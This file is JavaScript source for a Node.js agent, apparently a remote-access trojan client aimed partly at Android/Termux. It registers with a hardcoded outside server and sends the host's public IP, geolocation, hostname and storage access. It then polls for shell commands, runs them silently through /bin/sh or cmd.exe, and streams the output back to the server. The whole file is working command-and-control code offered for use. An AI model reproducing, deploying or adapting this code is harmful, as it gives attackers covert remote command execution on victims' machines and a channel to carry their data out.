// agent.js — Usage: node agent.js http://IP-SERVER:8000/api.php
const { spawn } = require('child_process');
const http = require('http');
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');

const SERVER = process.argv[2] || 'http://xnetforums.ct.ws/api.php';
const ID_FILE = path.join(os.homedir(), '.abcd-agent-id');

let MY_ID = null;
let MY_UUID = loadOrCreateUuid();
let lastCpu = cpuSnapshot();

// ---------- UUID persistent ----------
function loadOrCreateUuid() {
  try {
    if (fs.existsSync(ID_FILE)) {
      const u = fs.readFileSync(ID_FILE, 'utf8').trim();
      if (u) { console.log('[agent] reuse UUID:', u); return u; }
    }
  } catch(e) {}
  const u = crypto.randomUUID();
  try { fs.writeFileSync(ID_FILE, u); } catch(e) {}
  console.log('[agent] new UUID:', u);
  return u;
}

// ---------- HTTP ----------
function httpGet(u) {
  return new Promise((res, rej) => {
    const mod = u.startsWith('https') ? https : http;
    mod.get(u, r => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => res(d));
    }).on('error', rej);
  });
}

function httpPost(u, body) {
  return new Promise((res, rej) => {
    const uu = new URL(u);
    const mod = uu.protocol === 'https:' ? https : http;
    const payload = JSON.stringify(body);
    const req = mod.request({
      hostname: uu.hostname,
      port: uu.port,
      path: uu.pathname + uu.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
    }, r => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => res(d));
    });
    req.on('error', rej);
    req.write(payload);
    req.end();
  });
}

async function fetchJson(u) {
  try { return JSON.parse(await httpGet(u)); } catch(e) { return null; }
}

// ---------- CPU ----------
function cpuSnapshot() {
  const cpus = os.cpus();
  let idle = 0, total = 0;
  cpus.forEach(c => {
    for (const k in c.times) total += c.times[k];
    idle += c.times.idle;
  });
  return { idle, total };
}

function cpuUsage() {
  const now = cpuSnapshot();
  const idleDiff = now.idle - lastCpu.idle;
  const totalDiff = now.total - lastCpu.total;
  lastCpu = now;
  if (totalDiff === 0) return 0;
  return Math.max(0, Math.min(100, 100 - (idleDiff / totalDiff) * 100));
}

// ---------- SD ----------
function checkSdCardAccess() {
  const candidates = [
    '/sdcard',
    '/storage/emulated/0',
    '/storage/external-1',
    process.env.EXTERNAL_STORAGE,
  ].filter(Boolean);

  for (const p of candidates) {
    try {
      fs.readdirSync(p);
      try {
        const testFile = p + '/.termux_test_' + Date.now();
        fs.writeFileSync(testFile, 'test');
        fs.unlinkSync(testFile);
        return { path: p, readable: true, writable: true };
      } catch (e) {
        return { path: p, readable: true, writable: false };
      }
    } catch (e) {}
  }
  return { path: null, readable: false, writable: false };
}

// ============================================================
// STREAMING COMMAND — kirim chunk langsung per data event
// ============================================================
// Callback: onChunk(text) dipanggil tiap kali ada output baru
// Return: Promise resolve saat process selesai
function runCommandStream(cmd, onChunk) {
  return new Promise(resolve => {
    const isWin = process.platform === 'win32';
    const shell = isWin ? 'cmd.exe' : '/bin/sh';
    const args  = isWin ? ['/c', cmd] : ['-c', cmd];

    const child = spawn(shell, args, {
      windowsHide: true,
      env: { ...process.env, TERM: 'xterm-256color', LANG: 'C.UTF-8' },
    });

    child.stdout.on('data', d => onChunk(d.toString()));
    child.stderr.on('data', d => onChunk(d.toString()));
    child.on('close', code => {
      resolve();
    });
    child.on('error', err => {
      onChunk(`${err.message}\n`);
      resolve();
    });
  });
}

// ---------- Register ----------
async function register() {
  try {
    let publicIp = null;
    try {
      const r = await httpGet('https://api.ipify.org?format=json');
      publicIp = JSON.parse(r).ip;
    } catch(e) {}

    let geo = null;
    if (publicIp) {
      geo = await fetchJson(`http://ip-api.com/json/${publicIp}`);
      if (geo && geo.status !== 'success') geo = null;
    }

    const sd = checkSdCardAccess();

    const res = await httpPost(SERVER + '?action=register', {
      uuid: MY_UUID,
      publicIp, geo, sd,
      sysinfo: {
        platform: `${os.platform()} ${os.arch()}`,
        hostname: os.hostname(),
        cpu: cpuUsage(),
      },
    });
    const j = JSON.parse(res);
    if (j.ok) {
      MY_ID = j.id;
      console.log(`[agent] connected as #${MY_ID} (uuid: ${MY_UUID.slice(0,8)}...)`);
    }
  } catch (e) {
    console.log(`[agent] retry register (${e.code || e.message})`);
  }
}

// ---------- Disconnect ----------
async function disconnect() {
  if (!MY_ID) return;
  try {
    await httpPost(SERVER + '?action=disconnect', { id: MY_ID });
    console.log('[agent] disconnected');
  } catch(e) {}
}

// ============================================================
// EKSEKUSI COMMAND DENGAN STREAMING
// ============================================================
async function execStreaming(cmd) {
  // 1. Kasih tau server: command mulai
  await httpPost(SERVER + '?action=start', { id: MY_ID, cmd });

  // 2. Kirim chunk tiap kali stdout/stderr ngeluarin data
  await runCommandStream(cmd, async (chunk) => {
    try {
      await httpPost(SERVER + '?action=chunk', { id: MY_ID, chunk });
    } catch(e) {
      // kalo network glitch, jangan stop streaming
    }
  });

  // 3. Kasih tau server: selesai
  await httpPost(SERVER + '?action=done', { id: MY_ID });
}

// ---------- Main loop ----------
let busy = false;
let tick = 0;

async function loop() {
  try {
    if (!MY_ID) { await register(); return; }
    if (busy) return;

    tick++;
    if (tick % 3 === 0) {
      await httpPost(SERVER + '?action=sysinfo', {
        id: MY_ID,
        sysinfo: {
          platform: `${os.platform()} ${os.arch()}`,
          hostname: os.hostname(),
          cpu: cpuUsage(),
        },
      });
    }

    const res = await httpGet(`${SERVER}?action=pull&id=${MY_ID}`);
    const j = JSON.parse(res);
    if (!j.ok) { MY_ID = null; return; }

    for (const cmd of (j.commands || [])) {
      busy = true;
      console.log(`[agent] exec: ${cmd}`);
      await execStreaming(cmd);
      busy = false;
    }
  } catch (e) {
    if (MY_ID) console.log(`[agent] retry (${e.code || e.message})`);
  }
}

// ---------- Graceful shutdown ----------
let shuttingDown = false;
async function shutdown(sig) {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`\n[agent] received ${sig}, disconnecting...`);
  await disconnect();
  process.exit(0);
}
process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGHUP',  () => shutdown('SIGHUP'));

setInterval(loop, 1500);
loop();
